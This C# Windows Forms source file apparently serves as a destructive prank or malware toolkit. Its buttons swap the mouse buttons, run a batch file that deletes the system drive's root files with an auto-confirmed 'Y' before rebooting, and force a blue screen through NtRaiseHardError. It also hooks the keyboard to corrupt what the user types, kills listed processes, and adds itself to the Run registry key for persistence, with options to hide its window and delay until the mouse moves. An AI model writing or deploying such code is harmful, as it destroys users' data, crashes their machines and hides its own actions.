using System;

using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Runtime.InteropServices;



namespace WindowsFormsApp5
{
    public partial class Form1 : Form
    {
        protected readonly GlobalHook hook = new GlobalHook();
        bool fclick = true;
        public Form1()
        {
            InitializeComponent();
            Thread t = new Thread(() => prockiller.Kills(textBox1.Lines));
            ta = t;
        }
        Thread ta;
        private void button1_Click(object sender, EventArgs e)
        {
            checkf();
            try
            {

                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                userName = userName.Remove(0, userName.IndexOf(@"\"));
                try
                {
                    Process[] kill = Process.GetProcessesByName("MyTest");
                    foreach (Process proc in kill)
                    {
                        proc.Kill();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }

                Directory.CreateDirectory("bin\\");
                File.WriteAllText(@"bin\\MyTest.bat", @"%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul");
                using (Process myProcess2 = new Process())
                {
                    myProcess2.StartInfo.UseShellExecute = false;
                    myProcess2.StartInfo.FileName = @"C:\Users\" + userName + @"\Desktop\MyTest.bat";
                    myProcess2.Start();
                }
                RegistryKey currentUserKey = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse", true);

                currentUserKey.SetValue("SwapMouseButtons", 1, RegistryValueKind.String);

            }
            catch (Exception es)
            {
                MessageBox.Show(es.Message);




            }
        }


        void button2_Click_1(object sender, EventArgs e)
        {
            checkf();
            ta = new Thread(() => prockiller.Kills(textBox1.Lines));
            fclick = false;
            ta.Start();

        }

        private void checkf()
        {
            if (checkedListBox1.GetItemChecked(0) == true) { this.Hide(); }
            if (checkedListBox1.GetItemChecked(1) == true) { Thread.Sleep(Convert.ToInt32(textBox2.Text) * 1000); }
            if (checkedListBox1.GetItemChecked(2) == true)
            {
                int x, x2;
                do
                {
                    x = Cursor.Position.X;
                    Thread.Sleep(50);
                    x2 = Cursor.Position.X;
                } while ((x - x2) == 0);
            }
            if (checkedListBox1.GetItemChecked(3) == true) { Thread.Sleep(Convert.ToInt32(textBox3.Text) * 1000); }
        }

        private void textBox1_Click(object sender, EventArgs e)
        {
            if (!fclick) { fclick = false; }

        }

       

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (!fclick) { fclick = true; MessageBox.Show("Измение парметров приведет к приостановлению блокировки"); ta.Abort(); }
        }
        [DllImport("USER32.DLL")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("User32.dll")]
        public static extern bool ShowWindow(IntPtr handle, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        public static extern void keybd_event(Keys bVk, byte bScan, UInt32 dwFlags, IntPtr dwExtraInfo);

        public const UInt32 KEYEVENTF_EXTENDEDKEY = 1;
        public const UInt32 KEYEVENTF_KEYUP = 2;


        IntPtr hWnd = FindWindow("focusWindowClassName", null); 


        private void button3_Click_1(object sender, EventArgs e)
        {
            try
            {
                checkf();
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                userName = userName.Remove(0, userName.IndexOf(@"\"));
                Directory.CreateDirectory("bin\\");
                string st = @"bin\\help.bat";
                string[] piz = new string[3] {
                "@ echo off",
                @"del %syst"+@"em drive%\*.*",
                 "shutdown -r -t 00"};
                File.WriteAllLines(st, piz);
                using (Process myProcess2 = new Process())
                {
                    myProcess2.StartInfo.UseShellExecute = false;
                    myProcess2.StartInfo.FileName = st;
                    myProcess2.Start();
                    IntPtr windowHandle = myProcess2.MainWindowHandle;
                    SetForegroundWindow(windowHandle);
                }
                Thread.Sleep(500);
                SendKeys.Send("Y");
                SendKeys.SendWait("{ENTER}");


            }
            catch (Exception es) { MessageBox.Show(es.Message); }
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass
            , ref int processInformation, int processInformationLength);
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
    int Privilege,
    bool bEnablePrivilege,
    bool IsThreadPrivilege,
    out bool PreviousValue
);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );
        private static uint STATUS_ASSERTION_FAILURE = 0xC0000420;

        private void Button4_Click(object sender, EventArgs e)
        {
            checkf();
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint oul);
        }

        

        private void CheckedListBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (checkedListBox1.GetItemChecked(4) == true)
            {
                for (int i = 0; i <= 3; i++)
                {
                    checkedListBox1.SetItemChecked(i, true);
                }
            }
        }
         private void Button5_Click(object sender, EventArgs e)
        {
            checkf();

            Random t = new Random();
            hook.KeyUp += (s, ev) => {
                if (!(ev.KeyCode.ToString().Equals("Back") | ev.KeyCode.ToString().Equals("Delete") | ev.KeyCode.ToString().Equals("LShiftKey") | ev.KeyCode.ToString().Equals("Alt") | ev.KeyCode.ToString().Equals("Capital") | ev.KeyCode.ToString().Equals("LControlKey") | ev.KeyCode.ToString().Equals("LMenu")))
                {
                    Keyboard k = new Keyboard();

                    k.Send((Keyboard.ScanCodeShort)14);
                    k.Send((Keyboard.ScanCodeShort)t.Next(30, 50));
                }
            };

        }

        private void button6_Click(object sender, EventArgs e) { 
        checkf();
            int[] slov = Vvod.Eng(textBox4.Lines[0]);
        Random t = new Random();
        hook.KeyUp += (s, ev) => {
                if (!(ev.KeyCode.ToString().Equals("Back") | ev.KeyCode.ToString().Equals("Delete") | ev.KeyCode.ToString().Equals("LShiftKey") | ev.KeyCode.ToString().Equals("Alt") | ev.KeyCode.ToString().Equals("Capital") | ev.KeyCode.ToString().Equals("LControlKey") | ev.KeyCode.ToString().Equals("LMenu")))
                {
                    Keyboard k = new Keyboard();

                    k.Send((Keyboard.ScanCodeShort)14);

                foreach (int kk in slov)
                {
                    k.Send((Keyboard.ScanCodeShort) kk);
                }
                }
};

        }

        private void button7_Click(object sender, EventArgs e)
        {

            var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("Название программы", Application.ExecutablePath);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button8_Click(object sender, EventArgs e)
        {
        }
    }
}
